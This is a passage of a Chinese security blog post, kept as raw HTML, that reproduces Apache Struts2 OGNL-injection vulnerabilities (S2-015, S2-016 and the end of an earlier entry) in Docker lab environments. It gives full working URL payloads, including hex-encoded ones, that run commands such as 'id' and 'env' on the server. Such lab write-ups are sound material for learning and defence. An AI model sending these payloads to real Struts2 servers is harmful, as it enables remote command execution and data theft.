style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">BufferedReader</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">char</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">50000</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">],#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">c</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">read</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">out</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apache</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">struts2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ServletActionContext@getResponse</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getWriter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">out</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">println</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">out</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">close</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">())}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">// 或</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"allowStaticMethodAccess"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">true</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apache</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">commons</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IOUtils@toString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Runtime@getRuntime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'id'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">())}</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">认准exec执行系统命令即可，flag在环境变量里面，构造：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">http</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//192.168.1.8:8080/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.14978902953586498" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/24_uaNPEAicbGBrC0teibcypZCDSOkhCw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wLnibX3KoALVA9CBsE4NU7ic5PsnsuaNPEAicbGBrC0teibcypZCDSOkhCw/640?wx_fmt=png'" data-type="png" data-w="1896" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-015</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">s2-015漏洞远程攻击者可借助带有‘${}’和‘%{}’序列值（可导致判断OGNL代码两次）的请求，利用该漏洞执行任意OGNL代码</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-015的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.580896686159844" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/25_j9FzTQxXgR0KrLNh0FlqMTG8DLjvFg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wugm7qu0vcatIjG3AEOOiccmzaj9FzTQxXgR0KrLNh0FlqMTG8DLjvFg/640?wx_fmt=png'" data-type="png" data-w="1026" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先构造{1+1}得到payload</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">http</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//192.168.1.8:8080/${1+1}.action</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">执行后自动编码得到如下，在message处会回显</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">http</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//192.168.1.8:8080/$%7B1+1%7D.action</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.44299674267100975" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/26_psJoIeTsZZyoY8XCwAibp34Wz9JteA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w28iaiciaAibtiaRJa9kfNMpiaiaribibZJpsJoIeTsZZyoY8XCwAibp34Wz9JteA/640?wx_fmt=png'" data-type="png" data-w="614" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">构造payload显示id</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">http</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//192.168.1.8:8080/%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里在message处得到id需要进行url解码</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3136574074074074" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/27_qfgKlyX7nVdN15Ed4QCpFMEHPauBRg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wgibiaaUHUfqdicUKJgKhajvpIOrqfgKlyX7nVdN15Ed4QCpFMEHPauBRg/640?wx_fmt=png'" data-type="png" data-w="864" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.42805755395683454" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/28_x2HKZUYnuicBzRuJ4G29gpAnsKT6rg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wpZf5YH1syviauZ9mjpkg5smJ3Tx2HKZUYnuicBzRuJ4G29gpAnsKT6rg/640?wx_fmt=png'" data-type="png" data-w="556" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-016</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在struts2中，DefaultActionMapper类支持以"action:"、“redirect:”、"redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-016的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6472303206997084" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/29_SId1jvC54RHSmcicXGp1iaEJ7qaLWQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wM3AaTwOPGibPPutqdIkb7adRibNFSId1jvC54RHSmcicXGp1iaEJ7qaLWQ/640?wx_fmt=png'" data-type="png" data-w="1029" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">构造payload执行，可以发现执行过后网址后面出现了id</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">http</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//192.168.1.8:8080/index.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4231274638633377" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/30_yyrLcJz7O4TIaIGia1uESuspMdvUGQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wTFlTJkORhI0GSobmsbI1swV7lyyrLcJz7O4TIaIGia1uESuspMdvUGQ/640?wx_fmt=png'" data-type="png" data-w="761" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft 